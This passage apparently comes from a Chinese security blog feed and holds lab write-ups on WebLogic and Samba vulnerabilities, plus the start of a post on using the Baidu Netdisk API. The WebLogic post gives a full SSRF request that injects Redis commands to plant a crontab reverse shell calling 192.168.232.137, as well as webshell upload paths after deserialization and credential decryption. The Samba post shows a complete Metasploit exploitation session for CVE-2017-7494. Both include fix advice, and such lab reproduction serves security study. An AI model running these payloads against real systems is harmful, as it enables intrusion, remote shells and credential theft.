+<p>内容为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</div><div class="line">password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</div></pre></td></tr></table></figure></p>
+<p>加密key保存在SerializedSystemIni.dat文件中。默认位置：<br><code>安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p>
+<p>靶机中的位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p>
+<p>采用这两个文件就可以进行解密了。<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/解密密码.png" alt="解密WebLogic密码"></p>
+<p>WebLogic 11gR1之前的版本采用的DES加密方式。<br><code>安装目录/samples/domains/wl_server/security/boot.properties</code><br>内容格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</div><div class="line">password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</div></pre></td></tr></table></figure></p>
+<p>采用上面的解密工具即可解密。</p>
+<h3 id="0x02-WebLogic-SSRF漏洞"><a href="#0x02-WebLogic-SSRF漏洞" class="headerlink" title="0x02 WebLogic SSRF漏洞"></a>0x02 WebLogic SSRF漏洞</h3><p>漏洞编号：CVE-2014-4210<br>漏洞影响：<br>    版本10.0.2,10.3.6<br>    Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。<br>进入到<code>/weblogic/ssrf</code>目录，运行命令<code>sudo docker-compose build</code>进行编译。</p>
+<blockquote>
+<p>编译时将Dockerfile文件中的第六行<code>&amp;&amp; yum update \</code>修改为<code>&amp;&amp; yum update -y \</code>，不然会出现错误<code>ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex     &amp;&amp; yum update     &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1</code>。并且无法编译。（感谢P牛的解答）</p>
+</blockquote>
+<p>编译完成后进行启动<br>使用如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up <span class="_">-d</span> <span class="comment">#启动</span></div><div class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps <span class="comment">#查看启动的docker</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/启动WebLogic SSRF环境.png" alt="启动WebLogic SSRF环境"></p>
+<p>利用<a href="https://github.com/fupinglee/MyPython/blob/master/weblogic/weblogic_ssrf.py" target="_blank" rel="external">脚本</a>扫描内网开放端口的主机。</p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/SSRF扫描结果.png" alt="SSRF扫描结果"></p>
+<p>根据<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md" target="_blank" rel="external">https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md</a> 利用Redis反弹shell<br>在Ubuntu上执行命令<code>nc -l -p 1234</code><br>发送请求包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/<span class="built_in">test</span>%0D%0A%0D%0A<span class="built_in">set</span>%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20<span class="built_in">set</span>%20dir%20%2Fetc%2F%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1</div><div class="line">Host: 192.168.232.137:7001</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; W<span class="keyword">in</span>64; x64; rv:53.0) Gecko/20100101 Firefox/53.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/发送HTTP请求.png" alt="发送HTTP请求"></p>
+<p>过一会查看Ubuntu可以看到一个shell</p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反弹shell.png" alt="反弹shell"></p>
+<p><strong>修复建议：</strong><br>    1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。<br>    2.安装oracle的更新包。</p>
+<h3 id="0x03-WebLogic-反序列化漏洞"><a href="#0x03-WebLogic-反序列化漏洞" class="headerlink" title="0x03 WebLogic 反序列化漏洞"></a>0x03 WebLogic 反序列化漏洞</h3><p>漏洞编号：CVE-2015-4852<br>漏洞影响：<br>    Oracle WebLogic Server 12.2.1.0<br>    Oracle WebLogic Server 12.1.3.0<br>    Oracle WebLogic Server 12.1.2.0<br>    Oracle WebLogic Server 10.3.6.0<br>    Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。</p>
+<p>这里还以SSRF的环境为例。<br>使用WebLogic反序列化工具进行验证（作者：rebeyond)。<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反序列化1.png" alt="反序列化1"></p>
+<p>一般web项目位于<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/</code>中<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反序列化2.png" alt="反序列化2"></p>
+<p>发现没有_WL_user目录，所以把shell上传到自带的项目中。</p>
+<p>通过执行命令<code>ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/</code><br>发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。<br>将shell文件上传到任意一个目录下的war文件即可。</p>
+<p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt</code></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传测试文件.png" alt="上传测试文件"></p>
+<p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp</code></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传webshell.png" alt="上传webshell"></p>
+<p>也可以使用weget下载。</p>
+<p>使用weak_password时，上传路径为</p>
+<p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt</code></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传测试文件2.png" alt="上传测试文件2"></p>
+<blockquote>
+<p>找WEB绝对路径的另一种方式，Linux下使用命令<code>find -name *.jsp</code>来查找，例如已知hello项目里面有个file.jsp，则查找的命令为<code>find -name file.jsp</code>。对于Windows下，使用<code>for /r c:\ %i in (file*.jsp) do @echo %i</code>，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。</p>
+</blockquote>
+<p><strong>linux下查找文件路径</strong></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/找文件目录.png" alt="找文件目录"></p>
+<p><strong>Windows下查找路径</strong><br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/Windows下查找路径.png" alt="Windows下查找路径"></p>
+<p><strong>修复建议：</strong><br>    1.过滤T3协议<br>    2.安装补丁</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。<br>1.对于WebLogic弱口令，如何去上传WEBSHELL<br>2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。<br>3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。</p>
+<h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p>[1]<a href="https://github.com/phith0n/vulhub/tree/master/weblogic" target="_blank" rel="external">https://github.com/phith0n/vulhub/tree/master/weblogic</a><br>[2]<a href="http://blog.csdn.net/chs007chs/article/details/52514888" target="_blank" rel="external">http://blog.csdn.net/chs007chs/article/details/52514888</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> WebLogic漏洞 </tag>
+            
+            <tag> SSRF </tag>
+            
+            <tag> WebLogic反序列化 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Samba远程代码执行漏洞(CVE-2017-7494)复现过程]]></title>
+      <url>/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/</url>
+      <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。<br>这里采用ubuntu-16.04.2 x64位为测试机。<br><a id="more"></a></p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h4><p>靶机中默认未安装Samba，首先来安装Samba并进行配置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install samba</div></pre></td></tr></table></figure>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/安装samba.png" alt="安装samba"></p>
+<p>安装成功，查看版本</p>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/查看版本.png" alt="查看版本"></p>
+<p>修改Samba配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/samba/smb.conf</div></pre></td></tr></table></figure>
+<p>在最底部添加如下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></div><div class="line">path = /tmp</div><div class="line">public = yes</div><div class="line">writeable = yes</div></pre></td></tr></table></figure>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/修改配置文件.png" alt="修改配置文件"></p>
+<p>然后重启smbd服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo service smbd restart</div></pre></td></tr></table></figure>
+<p>至此，环境已经搭建成功。开始用Kail进行攻击。</p>
+<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>首先去下载利用的脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/exploits/linux/samba</span></div><div class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba<span class="comment"># wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/下载脚本.png" alt="下载脚本"></p>
+<p>然后就是在Metasploit中加载并使用脚本，攻击过程如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/linux/samba/is_known_pipename</div><div class="line">msf exploit(is_known_pipename) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/linux/samba/is_known_pipename):</div><div class="line"></div><div class="line">   Name            Current Setting  Required  Description</div><div class="line">   ----            ---------------  --------  -----------</div><div class="line">   RHOST                            yes       The target address</div><div class="line">   RPORT           445              yes       The SMB service port (TCP)</div><div class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</div><div class="line">   SMB_SHARE_BASE                   no        The remote filesystem path correlating with the SMB share name</div><div class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   2   Linux x86</div><div class="line"></div><div class="line"></div><div class="line">msf exploit(is_known_pipename) &gt; show targets</div><div class="line"></div><div class="line">Exploit targets:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line">   1   Linux ARM (LE)</div><div class="line">   2   Linux x86</div><div class="line">   3   Linux x86_64</div><div class="line"></div><div class="line"></div><div class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</div><div class="line">RHOST =&gt; 192.168.232.137</div><div class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> target 3</div><div class="line">target =&gt; 3</div><div class="line">msf exploit(is_known_pipename) &gt; exploit</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.232.134:4444</div><div class="line">[*] 192.168.232.137:445 - Using location \\192.168.232.137\fuping\ <span class="keyword">for</span> the path</div><div class="line">[*] 192.168.232.137:445 - Payload is stored <span class="keyword">in</span> //192.168.232.137/fuping/ as gRoUnyzb.so</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...</div><div class="line">[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...</div><div class="line">[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400</div><div class="line"></div><div class="line">id</div><div class="line">uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)</div><div class="line">whoami</div><div class="line">nobody</div><div class="line">ifconfig</div><div class="line">docker0   Link encap:Ethernet  HWaddr 02:42:23:77:72:91 </div><div class="line">          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0</div><div class="line">          inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link</div><div class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:0</div><div class="line">          RX bytes:0 (0.0 B)  TX bytes:180 (180.0 B)</div><div class="line"></div><div class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:77:23:9e </div><div class="line">          inet addr:192.168.232.137  Bcast:192.168.232.255  Mask:255.255.255.0</div><div class="line">          inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link</div><div class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:349052 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:419009840 (419.0 MB)  TX bytes:8902292 (8.9 MB)</div><div class="line"></div><div class="line">lo        Link encap:Local Loopback </div><div class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</div><div class="line">          inet6 addr: ::1/128 Scope:Host</div><div class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</div><div class="line">          RX packets:23329 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1</div><div class="line">          RX bytes:48010585 (48.0 MB)  TX bytes:48010585 (48.0 MB)</div></pre></td></tr></table></figure>
+<blockquote>
+<p>需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。</p>
+</blockquote>
+<p>效果图</p>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/脚本说明.png" alt="脚本说明"></p>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/攻击成功.png" alt="攻击成功"></p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><h4 id="2017-05-26-对需要登陆的Smb进行验证"><a href="#2017-05-26-对需要登陆的Smb进行验证" class="headerlink" title="2017.05.26 对需要登陆的Smb进行验证"></a>2017.05.26 对需要登陆的Smb进行验证</h4><p>脚本已经更新，集成在msf中，直接msfupdate即可。</p>
+<p><strong>1.修改Ubuntu中的Samba配置文件。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/samba/smb.conf</div></pre></td></tr></table></figure>
+<p>在<code>[global]</code>中添加：<code>security = user</code><br>修改底部的<code>[fuping]</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></div><div class="line">path = /tmp</div><div class="line">writeable = yes</div></pre></td></tr></table></figure>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/更新Samba配置文件.png" alt="更新Samba配置文件"></p>
+<p><strong>2.添加smb用户</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo useradd smbuser</div><div class="line">sudo smbpasswd <span class="_">-a</span> smbuser</div></pre></td></tr></table></figure>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/添加smb用户.png" alt="添加smb用户"></p>
+<p><strong>3.开始攻击</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/linux/samba/is_known_pipename </div><div class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBUSER smbuser</div><div class="line">SMBUSER =&gt; smbuser</div><div class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBPASS smbuser</div><div class="line">SMBPASS =&gt; smbuser</div><div class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</div><div class="line">RHOST =&gt; 192.168.232.137</div><div class="line">msf exploit(is_known_pipename) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/有验证攻击成功.png" alt="有验证攻击成功"></p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1.受影响的用户尽快下载最新的Samba版本手动更新。<br>2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作<br>3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/rapid7/metasploit-framework/pull/8450" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/8450</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3900.html</a><br>[3]<a href="https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/" target="_blank" rel="external">https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CVE-2017-7494 </tag>
+            
+            <tag> Samba漏洞 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[如何清除百度网盘重复文件]]></title>
+      <url>/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/</url>
+      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。<br>要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。<br><a id="more"></a></p>
+<h3 id="0x01-如何获取重复的文件"><a href="#0x01-如何获取重复的文件" class="headerlink" title="0x01 如何获取重复的文件"></a>0x01 如何获取重复的文件</h3><p>这里以wap版为例。<br>打开<a href="https://pan.baidu.com/wap/home" target="_blank" rel="external">https://pan.baidu.com/wap/home</a> 并抓包。<br>可以看到一个Get请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F</div></pre></td></tr></table></figure>
+<p><strong>主要请求参数：</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数名</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bdstoken</td>
+<td>网页源代码中有</td>
+</tr>
+<tr>
+<td>loginid</td>
+<td>BASE64(时间戳+四位+.+16位数字)，固定值即可</td>
+</tr>
+<tr>
+<td>page</td>
+<td>页码</td>
+</tr>
+<tr>
+<td>num</td>
+<td>每页显示条数</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>文件路径</td>
+</tr>
+<tr>
+<td>order</td>
+<td>排序的条件（固定时间排序即可）</td>
+</tr>
+<tr>
+<td>desc</td>
+<td>升序降序（降序排列即可）</td>
+</tr>
+</tbody>
+</table>
+<p>其他参数固定值即可<br>返回内容为JSON</p>
+<p><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/JSON内容.jpg" alt="JSON内容"></p>
